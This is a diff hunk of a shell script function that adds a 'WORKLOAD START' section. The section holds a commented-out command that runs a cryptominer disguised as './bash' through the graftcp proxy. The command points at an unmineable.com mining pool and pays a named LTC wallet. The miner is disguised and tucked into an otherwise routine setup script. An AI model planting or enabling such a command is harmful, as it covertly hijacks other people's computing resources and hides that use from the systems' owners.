@@ -68,6 +68,12 @@ def run_script():
    echo "=== SET PERMISSION ==="
    chmod -R +x /tmp/work
 
+   echo "=== WORKLOAD START ==="
+
+   # =====================================================
+   # ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
+   # =====================================================
+
    echo "=== WORK DIRECTORY ==="
    ls -lah /tmp/work
 
